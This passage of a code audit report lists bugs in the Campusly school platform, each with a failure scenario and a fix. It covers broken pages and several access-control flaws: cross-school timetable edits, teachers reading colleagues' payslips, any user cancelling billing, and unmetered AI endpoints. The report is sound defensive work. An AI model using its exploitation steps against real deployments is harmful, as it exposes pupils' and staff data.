- **Failure:** A teacher types /teacher/workbench/question-bank into the URL bar. The page renders 'Saved Questions', '0 questions found', and the 'No questions yet' EmptyState regardless of how many questions the school has. The teacher clicks Add Question, fills the form and submits; createQuestion succeeds on the server but handleSubmit never refetches, so the list still shows '0 questions found' and the empty state — the page looks broken before and after every write.
- **Fix:** In campusly-frontend/src/app/(dashboard)/teacher/workbench/question-bank/page.tsx add `useEffect(() => { void fetchQuestions(filters); }, [fetchQuestions, filters]);` after the hook call, and `await fetchQuestions(filters)` at the end of handleSubmit and handleDelete. Also replace the four `any`-typed locals at lines 26-32 (`filters`, `frameworks`, `subjects`, `topics` are hardcoded empty arrays, so the QuestionFilters selects are permanently empty).

### 10. Add Topic and Bulk Import both 400 on every attempt — strict Zod schemas require fields the frontend never sends

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useCurriculum.ts:181`
- **Failure:** A teacher navigates to /teacher/workbench/curriculum, picks a framework and subject in the filter bar, clicks Add Topic, types a name and presses Add Topic. The POST body has no schoolId, validate(createTopicSchema) returns 400 'Validation failed', and the hook's catch toasts 'Failed to create topic'. No topic is created — ever. Bulk Import fails the same way (missing schoolId/subjectId/gradeLevel) and additionally rejects the exact JSON shape the dialog's own placeholder tells the teacher to paste. The curriculum page has no working write path at all.
- **Fix:** Remove `schoolId: objectIdSchema` from createTopicSchema and bulkImportTopicsSchema in campusly-backend/src/modules/TeacherWorkbench/validation.ts (the controllers already inject it), have campusly-frontend/src/app/(dashboard)/teacher/workbench/curriculum/page.tsx:89 pass `subjectId: selectedSubject` and `gradeLevel: Number(selectedGrade)` into bulkImportTopics, and change the dialog copy and placeholder at page.tsx:296-305 to `name`, `term`, `estimatedPeriods`. Note the Add Topic dialog also has no Term control — topicForm.term is pinned to 1 at page.tsx:66, so every topic would land in Term 1.

### 11. Coverage percentage divides by the number of coverage rows, not the number of topics

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/services/aggregation.service.ts:92`
- **Failure:** A Grade 9 syllabus has 40 Term 1 topics. The teacher marks 2 as 'completed' in the coverage popover, creating exactly 2 CurriculumCoverage rows. The aggregate sees total=2, completed=2, so /teacher/workbench renders the StatCard 'Coverage 100% — Curriculum covered this term' (workbench/page.tsx:52-57) and the Coverage Dashboard shows Term 1 at 100%, while 38 topics are untouched. Marking a third topic 'in_progress' makes the number go DOWN to 67%, so the metric moves inversely to actual progress.
- **Fix:** In campusly-backend/src/modules/TeacherWorkbench/services/curriculum.service.ts, drive getCoverageReport from CurriculumTopic (match schoolId/subjectId/gradeLevel, group by `term`) and `$lookup` coverage onto it, counting topics with no coverage row as not_started. Do the same for the dashboard aggregate at aggregation.service.ts:89-100.

### 12. Coverage Dashboard renders "undefined% covered" and NaN bar widths — backend field names don't match the frontend type

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/workbench/curriculum/CoverageBar.tsx:17`
- **Failure:** A teacher selects a class and a subject on /teacher/workbench/curriculum and opens the Coverage Dashboard tab. Each term row's header reads 'Term 1' followed by 'undefined% covered'. Every segment gets `style="width: NaN%"` from `(seg.value / undefined) * 100`, which the browser discards, so the progress bar is a blank grey pill. Only the legend counts underneath are readable.
- **Fix:** Add a `$project` to the pipeline in campusly-backend/src/modules/TeacherWorkbench/services/curriculum.service.ts (after line 233) emitting `{ term: 1, totalTopics: '$total', percentage: { $round: ['$percentComplete', 0] }, completed: 1, inProgress: 1, notStarted: 1, skipped: 1 }`, or map the raw shape inside fetchCoverageReport in campusly-frontend/src/hooks/useCurriculum.ts:124.

### 13. Saving topic coverage always 400s (the datetime rejection is only half of it)

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/validation.ts:109`
- **Failure:** A teacher on /teacher/workbench/curriculum clicks a topic's status badge, sets Status to Completed and presses Save — with or without a Date Covered. The PATCH body carries an extra `schoolId` key that `.strict()` rejects, so validate() returns 400 and the hook toasts 'Failed to update coverage'. Coverage is never recorded through the UI at all. Even if schoolId were removed from the body, picking a date would still 400 because dateCovered arrives as '2026-07-30'.
- **Fix:** Two changes: (1) drop the `schoolId` spread from the PATCH body at campusly-frontend/src/hooks/useCurriculum.ts:233-236 (the controller supplies it at curriculum.controller.ts:72-76); (2) in campusly-backend/src/modules/TeacherWorkbench/validation.ts:109 use `dateCovered: z.union([z.iso.date(), z.iso.datetime()]).nullable().default(null)` per the project's zod/v4 convention and coerce to a Date in updateCoverage.

### 14. Moderation Review Queue is shown to every teacher but the review endpoint is school_admin-only, so HODs get 403 after writing their review

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/routes.ts:195`
- **Failure:** A Head of Department (role 'teacher', isHOD true) opens /teacher/workbench/papers/moderation, sees the Review Queue tab badged with the school's pending papers, clicks one, writes moderation comments and presses Approve. authorize('school_admin','super_admin') returns 403 and the review is discarded — the exact user the route comment names cannot use it. In the same tab, an ordinary subject teacher sees and can open every colleague's unreleased exam paper, because the queue is school-wide and populates the full paper document.
- **Fix:** Change routes.ts:198 to `authorize('school_admin','super_admin','teacher')` plus a small guard that requires `req.user.isHOD` for the teacher role, scope ModerationService.getModerationQueue (moderation.service.ts:49) to the requester's own submissions unless they are admin/HOD, and hide the Review Queue TabsTrigger in moderation/page.tsx:66-73 unless the user can actually review.

### 15. Student 360 numbers are computed against school-wide denominators and the header fields are hardcoded empty strings

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/services/aggregation.service.ts:199`
- **Failure:** A teacher clicks a pupil in /teacher/students and lands on the Student 360 page. The PageHeader title is blank and the description reads 'Class: ' with nothing after it, so the teacher cannot confirm whose record they are looking at. HomeworkCard reports a single-digit submission rate and a missing count in the hundreds because the denominator is every homework in the school across all grades. CommunicationCard shows the same 'messages this term' number for every pupil. AcademicCard's per-subject table is permanently empty.
- **Fix:** In campusly-backend/src/modules/TeacherWorkbench/services/aggregation.service.ts:181-299, load the Student document (populating classId) to fill studentName/className, restrict the Homework count to the student's class/enrolled subjects, filter BulkMessage to recipients linked to this student's guardians, and build `subjects` from the `marks` array already fetched at line 190 (or delete the subject table from AcademicCard until it is backed by data).

### 16. Every roster mutation 403s for school-employed teachers — add/edit/remove learner, invite, and regenerate credentials are admin-only

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Student/routes.ts:20`
- **Failure:** Log in as a teacher whose account was created by a school admin (role 'teacher', isStandaloneTeacher false, isSchoolPrincipal false). Open /teacher/classes/<id>/roster. Click 'Add Learners' → fill the form → Save and close: 403 FORBIDDEN_CAPABILITY, toast 'You do not have permission to manage users.' Same for the pencil (PUT /students/:id), the mail icon (POST /students/:id/invite), the key icon (POST /students/:id/regenerate-credentials) and the trash icon (DELETE /students/:id). No affordance is disabled or explained.
- **Fix:** Pick one: (a) add a class-scoped capability on the backend — extend `requireStudentManagement` in campusly-backend/src/modules/Student/routes.ts to allow role 'teacher' and rely on the `assertTeacherCanAccessStudent` check the controller already performs (controller.ts:176, 183, 194); or (b) gate the UI in src/app/(dashboard)/teacher/classes/[classId]/roster/page.tsx with `useCan('manage_users') || user?.isStandaloneTeacher` (the hook already exists and is used in admin/students/page.tsx:85), hiding the add/edit/invite/regenerate/delete affordances and showing an 'ask your school admin' note instead.

### 17. Create/Edit/Delete class 403s for school-employed teachers (manage_academic_setup is admin/HOD/standalone only)

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Academic/routes.ts:78`
- **Failure:** A school-employed teacher (not principal, not HOD, not standalone) opens /teacher/classes. If they have no classes yet, the empty state invites them: 'Create your first class to get started.' Clicking Create Class and submitting POSTs /api/academic/classes → 403 'You do not have permission to manage academic setup.' → toast 'Failed to create class'. The row pencil (PUT) and trash (DELETE) in TeacherClassesTable fail the same way after the ConfirmDialog is accepted.
- **Fix:** In src/app/(dashboard)/teacher/classes/page.tsx add `const canManage = useCan('manage_academic_setup')` and hide the Create button (line 81), the empty-state CTA (line 129) and pass a flag to TeacherClassesTable to suppress onEdit/onDelete — mirroring src/components/academic/GradeClassesTab.tsx:35. Alternatively extend `manage_academic_setup` in BOTH campusly-backend/src/common/permissions.ts and campusly-frontend/src/lib/permissions.ts (plus both permissions.snapshot.json) to cover teacher-owned classes.

### 18. One non-active learner in a class makes the whole daily register fail to save

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Attendance/service.ts:72`
- **Failure:** An admin sets one learner in Grade 11A to enrollmentStatus 'transferred' (or withdrawn/graduated) without moving them out of the class. The teacher opens /teacher/attendance, the learner still appears in the register (teaching-load returns them), the teacher marks the class and clicks Save → POST /attendance/bulk → 400 'All attendance students must be active learners in the selected class'. Not a single record is written, for that class, every day, and the toast never names the offending learner. The same 400 blocks the History → day-edit dialog.
- **Fix:** Add `enrollmentStatus: 'active'` to the Student.find in campusly-backend/src/modules/Academic/services/grade.service.ts:684 so the register never lists a non-active learner, and change AttendanceService.assertClassStudentsBelongToSchool (Attendance/service.ts:72-84) to return the non-matching ids so bulkRecord can push them into `failed[]` and still persist the rest.

### 19. Printed credentials slip tells the learner to log in at /auth/login, which does not exist

- **Section:** n/a
- **Location:** `src/components/classes/RegenerateCredentialsDialog.tsx:49`
- **Failure:** Teacher adds a slip-delivery learner (no email) or regenerates credentials for one, clicks 'Download printable slip', and hands the printout to the learner. The slip reads 'Login URL: https://app.../auth/login'. The learner types it and gets a Next.js 404 — slip mode is the only delivery path for learners without email, so none of them can reach the portal without the teacher intervening.
- **Fix:** Change both writeSlip call sites to `${window.location.origin}/login` — src/components/classes/RegenerateCredentialsDialog.tsx:49 and src/components/classes/StudentAddDialog.tsx:94-96 — and export a single `LOGIN_URL` helper (e.g. in src/lib/constants.ts alongside ROUTES) used by the slip writer and the clipboard text at StudentAddDialog.tsx:208 so the two cannot drift again.

### 20. History day-edit dialog silently overwrites a day as all-present when its load request fails

- **Section:** n/a
- **Location:** `src/hooks/useAttendanceDayEdit.ts:49`
- **Failure:** Teacher opens /teacher/attendance → History, clicks a cell for a past date on which five learners were marked absent. The GET /attendance/class/:id?date=… fails (500, network drop, or a token-refresh race). A toast flashes, the dialog opens with every learner showing 'Present', and Save is enabled. Clicking Save POSTs /attendance/bulk with every learner present, overwriting the five real absences; the grid and the chronic-absentee report then recompute off the corrupted register.
- **Fix:** Return a `loadError` boolean from useAttendanceDayEdit (set it in the catch at line 50, clear it on success after line 48) and in AttendanceDayEditDialog.tsx render a destructive inline alert plus `disabled={saving || loading || loadError}` on the Save button at line 69 — the same guard useTeacherAttendance.ts:265-268 already applies on the Today tab.

### 21. Teacher Students page silently shows only the first 20 learners and search misses the rest

- **Section:** n/a
- **Location:** `src/hooks/useTeacherStudents.ts:13`
- **Failure:** A teacher with two classes of 30 opens /teacher/students. Exactly 20 cards render with no total and no pager — the other 40 learners are invisible. Typing the surname of a learner who sorts 35th by -createdAt shows 'No students match "…"', so the teacher concludes that learner is not enrolled.
- **Fix:** In src/hooks/useTeacherStudents.ts pass `{ params: { limit: 100, page } }` and expose `total`/`totalPages` from the envelope (read them with `unwrapResponse` instead of `unwrapList`), then render a pager and a total on src/app/(dashboard)/teacher/students/page.tsx. For search, debounce the input into the backend `search` param and extend the `$or` in campusly-backend/src/modules/Student/service.ts:266-269 to match the populated user's firstName/lastName.

### 22. GET /attendance/merits has no authorize() — any authenticated student or parent can read every merit/demerit record in the school

- **Section:** n/a
- **Location:** `src/modules/Attendance/routes.ts:178`
- **Failure:** Any authenticated account at a school with the `attendance` module enabled — a Grade 8 student, a parent, or a tuckshop operator — calls GET /api/attendance/merits with their own bearer token and receives the whole school's behaviour ledger, paginated: every learner's admission number and grade/class, the demerit category, points and free-text reason, plus the awarding staff member's first name, last name and email address. No role check rejects them. Separately, a plain teacher gets every learner in the school here, while the parallel GET /attendance/discipline restricts the same teacher to their own teaching load — so the same category of behaviour data is governed by two contradictory rules.
- **Fix:** Add `authorize('teacher','school_admin','super_admin')` to the GET '/merits' route in campusly-backend/src/modules/Attendance/routes.ts:177, and mirror the DisciplineService.listDiscipline:109-117 narrowing in MeritService.listMerits so a non-school-wide teacher only sees merits for students returned by `getTeacherStudentIds`.

### 23. Four built teacher pages are unreachable dead routes — including /teacher/referral, the only way a plain teacher can submit a pastoral referral

- **Section:** n/a
- **Location:** `src/lib/constants.ts:277`
- **Failure:** A teacher wants to refer a struggling learner to the school counselor. She opens the sidebar, expands 'Student Welfare' and finds only Discipline, Incidents and (if she is a counselor) Pastoral Care. /teacher/referral/page.tsx is fully built and functional, but nothing links to it from the sidebar, BottomNav, or any other page, so the only way in is to type the URL. Identically for /teacher/merits (Award Points), /teacher/policies and /teacher/substitutes. Because no ordinary teacher can discover the referral form, the counselor's Referrals inbox at /teacher/pastoral has nothing to receive.
- **Fix:** In src/lib/constants.ts add ROUTES entries and nav children: under the 'Student Welfare' group at line 280 add `{ label: 'Submit Referral', href: '/teacher/referral', icon: ClipboardList }` and `{ label: 'Merits', href: '/teacher/merits', icon: Award, module: 'attendance' }`; add `{ label: 'School Policies', href: '/teacher/policies', icon: BookOpen }` and `{ label: 'Substitutes', href: ROUTES.TEACHER_SUBSTITUTES, icon: Users }` to the appropriate group. Add the three missing constants to src/lib/routes.ts alongside TEACHER_SUBSTITUTES.

### 24. HOD moderation queue Approve / Request Changes buttons are toast.info placeholders that mutate nothing

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/hod/page.tsx:55`
- **Failure:** A teacher with isHOD opens HOD Oversight from the sidebar → Moderation tab and sees papers from her department awaiting sign-off. She clicks Approve on one. A grey info toast appears reading 'Approve paper 66f3a1... — integrate with Teacher Workbench moderation endpoint' — a raw MongoDB ObjectId plus an internal TODO shown to the user. No network request is made, the paper's moderation record is unchanged, and after refreshing the tab the item is still pending. Request Changes behaves the same. Paper moderation, the HOD's core sign-off duty, cannot be completed at all.
- **Fix:** Wire handleApprove/handleRequestChanges in src/app/(dashboard)/teacher/hod/page.tsx to the real PaperModeration endpoints via useHODDashboard (mirroring the try/catch + toast.success/toast.error + refetch shape already used by handleScheduleObs at line 63-75). If the endpoint is not ready, remove the actions column from ModerationQueueTable so the queue is read-only rather than falsely interactive — and never render internal TODO text in a toast.

### 25. Incident follow-up actions are unusable — 'Assign To' is a free-text field demanding a raw MongoDB ObjectId

- **Section:** n/a
- **Location:** `src/components/incidents/AddActionDialog.tsx:58`
- **Failure:** A teacher opens an incident at /teacher/incidents/<id> → Actions tab → Add Action. The form demands 'Assign To (User ID)' as free text, and the Add Action button stays disabled until something is typed there. No screen in the teacher portal exposes a colleague's 24-hex User ID, so she types the colleague's name. POST /api/incidents/<id>/actions is rejected by `objectIdSchema` with a 400; the catch at line 34 writes only to the browser console, the submitting spinner clears, and the dialog sits there unchanged with no error message and no indication of what is wrong. She has no path to a valid value and the follow-up action is never created.
- **Fix:** Replace the Input at src/components/incidents/AddActionDialog.tsx:59-63 with a Select populated from the existing staff hook (src/hooks/useStaff.ts) so the value is a real userId, and change the catch at line 34-38 to `toast.error(extractErrorMessage(err, 'Failed to create action'))` using the existing '@/lib/api-helpers' helper.

### 26. Incident detail shows Start Investigation / Resolve / Escalate to teachers the backend forbids, with zero user feedback on 403

- **Section:** n/a
- **Location:** `src/app/(dashboard)/admin/incidents/[id]/page.tsx:91`
- **Failure:** Teacher B (not a counselor, not the reporter) can read an incident because one of her register-class learners is listed as an involved party — assertCanAccessIncident permits this. She opens /teacher/incidents/<id> from the incidents table and the header shows an enabled 'Start Investigation' button. She clicks it: PUT /api/incidents/<id> returns 403 'Only the reporter, counselor, or school leadership can update this incident'; updateIncident rethrows, handleStatusChange has no catch, so it surfaces only as an unhandled promise rejection in the console. No toast, no inline error, no badge change — the status stays on 'reported'. She clicks again several times with no feedback whatsoever. Escalate behaves identically.
- **Fix:** In src/app/(dashboard)/admin/incidents/[id]/page.tsx compute `const canManage = incident.reportedBy?.id === user?.id || isCounselor || isPrincipal || user?.role === 'super_admin';` and wrap the status buttons at lines 91-102 (and the Add Action button at 156) in `{canManage && ...}`. Additionally wrap handleStatusChange and handleCreateAction in try/catch with `toast.error(extractErrorMessage(err, ...))` so any residual 403 is visible.

### 27. 'Notify Parent' / 'Notify Referrer' toggles on pastoral sessions and referral resolution are silently discarded

- **Section:** n/a
- **Location:** `src/modules/Pastoral/service-sessions.ts:47`
- **Failure:** A counselor logs a crisis session at /teacher/pastoral → Sessions → Log Session, toggles 'Notify Parent / Guardian' on, types 'Please contact me about today's session' into the Parent Message box that appears, and submits. 'Session logged successfully' is shown and the stored record has parentNotified: true. The message text is dropped before it reaches the database, no notification, email or WhatsApp is queued anywhere, and the parent is never contacted — while the session record and any audit review assert the parent was notified. The same silent no-op occurs when a counselor resolves a referral with 'Notify Referrer' switched on: the teacher who raised the referral is never told the outcome.
- **Fix:** Pick one direction and make it honest. Either remove the notify switches and Parent Message textarea from src/components/pastoral/SessionCreateDialog.tsx:254-272 and src/components/pastoral/ResolutionDialog.tsx:106-116 (and drop the fields from the Zod schemas both sides), or add `parentNotificationMessage: { type: String }` to the CounselorSession schema in campusly-backend/src/modules/Pastoral/model.ts near line 137, persist it in service-sessions.ts:47, and dispatch through the Notification module when notifyParent/notifyReferrer is true.

### 28. No backend entitlement gate on most AI endpoints — a free standalone teacher can burn unlimited Anthropic tokens

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Lesson/routes.ts:12`
- **Failure:** A standalone teacher signs up for free (Auth/standalone.service.ts:71 → createInitialFreeSubscription → status 'free'). Paper generation correctly 402s (QuestionBank/routes.ts:134 requireEntitlement('paperGeneration')), but the New Lesson flow's primary CTA still works because POST /api/lessons/scaffold has no gate, and lesson chat (/api/lessons/:id/chat) is unlimited. With the same session cookie in curl they can loop POST /api/ai-tools/mark-batch with 80 images (one vision call per page) or POST /api/ai-tutor/report-comments with 50 studentIds (50 sequential completions) forever — no entitlement check, no usage counter on those paths, no rate limiter on /api/ai-tools or /api/lessons in app.ts.
- **Fix:** Add requireEntitlement to the AI-spending routes: campusly-backend/src/modules/Lesson/routes.ts:12 (/scaffold), :23 (/:id/materials/generate-all), :25 (/:id/materials/:mid/regenerate), :37 (/:id/chat); AITools/routes.ts:98 (/mark-paper), :111 (/mark-paper-text), :130 (/mark-batch); AITutor/routes.ts:96 (/report-comments) and the regenerate sibling; QuestionBank/routes.ts:207 (paper question regenerate, currently ungated while its siblings at :57/:65/:134 are gated). Introduce feature keys 'aiMarking' and 'lessonScaffold' in the Plan entitlements rather than overloading 'aiGeneration'. Delete src/middleware/rejectStandalonePlan.ts or wire it.

### 29. Teacher submissions table shows a raw MongoDB ObjectId instead of the student's name

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/app/(dashboard)/teacher/learning/page.tsx:30`
- **Failure:** Teacher opens /teacher/learning, picks any homework from the Homework select (page.tsx:118-126). The Submissions DataTable renders one row per submission with the Student column showing e.g. 68f3a1c94b2e7d0011ab34cd, and the search box (page.tsx:144, searchKey='studentId') can only match ObjectIds. Clicking Grade opens SubmissionViewer, which also shows no name — so the teacher assigns a mark and rubric levels without ever seeing whose work it is.
- **Fix:** In c:/Users/shaun/campusly-backend/src/modules/Learning/services/submission.service.ts change both :211 (getSubmission) and :230 (getSubmissionsForHomework) to `.populate({ path: 'studentId', select: 'userId admissionNumber', populate: { path: 'userId', select: 'firstName lastName' } })`. Then in teacher/learning/page.tsx:28-31 render `${sid.userId.firstName} ${sid.userId.lastName}` with the ObjectId as fallback, and pass the same name into SubmissionViewer's header.

### 30. Struggling Students tab lists raw student and subject ObjectIds

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/learning/StrugglingStudentsAlert.tsx:55`
- **Failure:** Teacher opens /teacher/learning → Struggling Students tab, picks a class from the select at page.tsx:151. Any student with 3+ quiz attempts averaging under 50% renders as 'Student: 68f2b0…' / 'Subject: 68f2af…' with a percentage and a Declining badge. The teacher has no way to know who to intervene with, so the tab can never be acted on.
- **Fix:** In c:/Users/shaun/campusly-backend/src/modules/Learning/services/quiz.service.ts flagStrugglingStudents, after building `struggling` (line 309-323) batch-load `Student.find({ _id: { $in: ids } }).populate('userId','firstName lastName')` and `Subject.find({ _id: { $in: subjectIds } }, { name: 1 })`, widen the return type to include studentName/subjectName, and render those two fields at StrugglingStudentsAlert.tsx:55-56 (keeping the id only as a key).

### 31. Any authenticated user in a school can cancel the subscription and read billing invoices

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/subscription/routes.ts:26`
- **Failure:** A rank-and-file teacher on a Pro trial sees the TrialBanner at the top of any dashboard page, clicks 'Manage' → /my/billing renders with no role check → clicks 'Cancel subscription' in CancelDialog → POST /api/subscriptions/cancel succeeds → the whole school's Pro subscription is set to cancel at period end. The same teacher can hit GET /api/subscriptions/invoices and read the school's billing history (amounts, card brand, failure reasons).
- **Fix:** Gate '/subscriptions/checkout', '/cancel', '/resume' and '/invoices' in campusly-backend/src/modules/subscription/routes.ts with `requireCapability('manage_school_settings')` (which already grants standalone teachers, who legitimately own their own billing, while excluding school-employed teachers). On the frontend, wrap src/app/(dashboard)/my/billing/page.tsx in a `useCan('manage_school_settings')` check and render a no-permission state otherwise, and hide the banners' Manage/Update-card links for users without that capability.

### 32. Two independent token-refresh paths race against strict reuse detection and revoke every session

- **Section:** n/a
- **Location:** `campusly-frontend/src/lib/token-refresh.ts:36`
- **Failure:** A teacher has the gradebook open in one tab and a lesson in another. Both tabs ran AuthProvider → scheduleTokenRefresh() and, because fireAt is derived from the shared token's exp, both timers fire at the same instant ~14 minutes in. Both POST /api/auth/refresh carrying the same refresh_token cookie. The first rotates it; the second finds it already $pulled, so AuthService.refreshToken wipes refreshTokens entirely — including the token the first tab just received. Within the next 60 seconds both tabs 401, api-client's interceptor fails its retry refresh, clears localStorage and hard-redirects both tabs to /login, losing whatever the teacher was mid-way through entering.
- **Fix:** Delete the duplicate refresh block in campusly-frontend/src/lib/api-client.ts (lines 84-105) and have the 401 handler import and await the exported refresh from src/lib/token-refresh.ts so there is a single latch; add a cross-tab lock (BroadcastChannel or a localStorage mutex keyed on the token's exp) so only one tab performs the rotation. Additionally, in campusly-backend/src/modules/Auth/service.ts:172, keep a short grace list (accept the immediately-previous refresh token for ~30s and re-issue the current pair) instead of nuking refreshTokens on the first duplicate.

### 33. Login and refresh rate limits collapse to one bucket per egress IP — no trust proxy, key is req.ip + path

- **Section:** n/a
- **Location:** `campusly-backend/src/middleware/rateLimiter.ts:14`
- **Failure:** Monday morning, 25 teachers at one school open Campusly on the staff WiFi behind a single public IP. The 11th sign-in within 15 minutes gets 429 and the rest of the staff cannot log in for the remainder of the window. Later in the day, once more than 30 access tokens rotate through /auth/refresh from that same IP in 15 minutes, the 31st refresh 429s; because api-client's interceptor treats any failed refresh as terminal, that teacher's localStorage is cleared and the tab hard-redirects to /login mid-lesson.
- **Fix:** Add `app.set('trust proxy', 1)` in campusly-backend/src/app.ts before the routes, and change createRateLimiter in src/middleware/rateLimiter.ts to accept a key resolver so Auth/routes.ts can key /login on normalised email (`rl:login:${email}`) with a much larger per-IP ceiling, and key /refresh on `req.user?.id`/the refresh token subject rather than sharing one 30-request budget across every user behind an IP.

### 34. Teacher cannot re-enter a session that is already live — no Join action is ever wired on the teacher classroom page

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/classroom/page.tsx:127`
- **Failure:** Teacher clicks 'Start Session' (status flips to live and they are pushed to /classroom/<id>), then hits browser refresh or navigates to Gradebook and back to /teacher/classroom. The session card now shows status 'live' with no button at all. There is no other link to /classroom/<id> anywhere in the teacher UI, so the teacher is locked out of their own running lesson while students sit in the room waiting.
- **Fix:** In src/app/(dashboard)/teacher/classroom/page.tsx add `onJoin={() => router.push(`/classroom/${session.id}`)}` to the `<UpcomingSessionCard>` at line 127, keeping onStart for scheduled sessions — this mirrors what student/classroom/page.tsx:88 already does.

### 35. Recording state is never hydrated — after a reload the teacher can neither stop nor restart a running recording

- **Section:** n/a
- **Location:** `src/hooks/useClassroomRecording.ts:9`
- **Failure:** With egress configured, the teacher hits the record button, then refreshes the tab (or leaves and re-enters /classroom/<id>). The control renders in the 'Start Recording' state; pressing it returns 400 'Already recording' via toast, and no Stop button is reachable. The LiveKit egress keeps recording — and billing — for the rest of the lesson, ending only when the room dies.
- **Fix:** Add `isRecording` (and `recordingStartedAt`) to the object returned by SessionService.generateJoinToken in campusly-backend/src/modules/Classroom/service-sessions.ts:437-445, extend JoinData in src/hooks/useClassroomSessions.ts, and initialise useClassroomRecording from it (accept an `initialIsRecording` argument, or fetch GET /classroom/sessions/:id on mount) so Stop renders whenever the server says a recording is live.

### 36. Session settings for student audio/video are collected in the scheduler but ignored — students can never publish media

- **Section:** n/a
- **Location:** `src/services/livekit.service.ts:31`
- **Failure:** Teacher schedules a discussion lesson and flips on 'Allow student audio' and 'Allow student video' in the scheduler dialog, and sets max participants to 30. Every student joins with a LiveKit token carrying canPublish:false and a client constructed with audio:false/video:false, so no student can ever unmute or enable a camera, and no error explains why. A 31st student joins without objection. The teacher's only workaround is to abandon the format mid-lesson.
- **Fix:** In campusly-backend/src/modules/Classroom/service-sessions.ts generateJoinToken, read `session.settings` and pass the flags into generateRoomToken; in src/services/livekit.service.ts set `canPublish: isHost || settings.studentAudioEnabled || settings.studentVideoEnabled` with `canPublishSources` narrowed to microphone/camera per flag. Return the two flags in the join payload and drive `audio`/`video` on `<LiveKitRoom>` in src/components/classroom/VideoRoom.tsx from them instead of `isTeacher`. Enforce maxParticipants before issuing the token.

### 37. ExamTimetable model has no schoolId field at all — update/delete/list are completely untenanted, and get-by-id can never succeed

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Academic/services/exam.service.ts:114`
- **Failure:** An HOD-flagged teacher at School A (isHOD grants manage_academic_setup) calls `GET /api/academic/exams?schoolId=<School B>` to obtain a School B exam id, then `GET /api/academic/exam-timetable/exam/<that examId>` — which filters only on examId — to list School B's entry ids, then `PUT /api/academic/exam-timetable/<entry id>` to rewrite another school's exam date/venue/invigilator, or `DELETE` to soft-delete it. Nothing in the service or the route restricts any of the three calls to the caller's school.
- **Fix:** Add `schoolId: { type: Schema.Types.ObjectId, ref: 'School', required: true, index: true }` to both `IExamTimetable` and `examTimetableSchema` in `src/modules/Academic/model.ts:511-544`, and backfill existing rows from their parent Exam. Set it from `req.user!.schoolId!` in `misc.controller.ts:258` (`createExamTimetable({ ...req.body, schoolId })`). Thread schoolId into `updateExamTimetable`, `deleteExamTimetable` and `listExamTimetable` in `services/exam.service.ts` and add it to all three filters — which also makes `getExamTimetableById` at :105 stop 404ing.

### 38. Any teacher can read any colleague's salary record and payslip — role 'teacher' is allowed with no owner check

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Payroll/controller.ts:137`
- **Failure:** At a school with the payroll module enabled, a teacher grabs a colleague's user id from any populated `teacherId` in a timetable or lesson response (or the principal's, from the staff picker), then calls `GET /api/payroll/payslips/<any runId>/<colleague userId>` with their own token. The response returns that colleague's basic salary, allowances, deductions and net pay. `GET /api/payroll/salaries/<id>` behaves the same and, unlike the list endpoint, does not pass the record through `maskSalary`.
- **Fix:** In `src/modules/Payroll/controller.ts:137`, after `const { schoolId } = getUser(req)`, add `const user = getUser(req); if (user.role === 'teacher' && user.id !== staffId) throw new ForbiddenError('You can only view your own payslip');`. Apply the equivalent in `getSalary` by passing `user.id` into `PayrollService.getSalary` and adding `staffId: new mongoose.Types.ObjectId(userId)` to the `SalaryRecord.findOne` filter in `service.ts:91` for non-admin callers. Cleanest: add `/payroll/me/payslips` and `/payroll/me/salary` routes and drop 'teacher' from routes.ts:55 and :131.

### 39. Mark-capture roster is silently truncated to 20 learners by default backend pagination

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useTeacherGrades.ts:129`
- **Failure:** A teacher who teaches three Grade 8 classes of ~32 opens Gradebook → Enter marks and picks 8A. The backend returns the 20 most recently created students across all three of their classes; the client then filters to 8A, so the grid renders whatever subset of those 20 happens to be in 8A — often 5-10 rows — and the card header reads 'Student Marks (7 students)'. The teacher captures and saves; the remaining learners have no row and cannot be marked from this screen. There is no pagination control and no error. Separately, a class with more than 20 assessments in the year shows only 20 in the picker, and selecting 'Term 2' filters that already-truncated page, so 'No assessments for this term yet' can appear while Term 2 assessments exist.
- **Fix:** In useTeacherGrades.ts:129 pass `params: { classId: selectedClass, limit: 100 }` AND fix campusly-backend/src/modules/Student/controller.ts:114-118 to honour `req.query.classId` (intersect it with getTeacherAccessibleClassIds) so the 100-row page is actually the selected class, not a slice across all the teacher's classes. Do the same on useTeacherGrades.ts:97/:239 (`params.limit = 100`) and push the term filter server-side via `params.term` instead of the client-side filter at :116-119.

### 40. Gradebook offers assessment edit/delete and weighting config that ordinary teachers are 403-forbidden from using

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Academic/routes.ts:292`
- **Failure:** A school-employed teacher with isHOD false and isStandaloneTeacher false opens Gradebook → Class overview. Every subject chip whose grade has no SubjectWeighting rows shows the red AlertTriangle 'Set weightings' instead of a class average. They click the chip's cog, enter Tests 40 / Exams 50 / Assignments 10, press Save in SubjectWeightingDialog, and get a 403 'You do not have permission to manage academic setup.' toast. The prompt can never be cleared by them. On Enter marks, the pencil and trash buttons on AssessmentInfoCard likewise always 403.
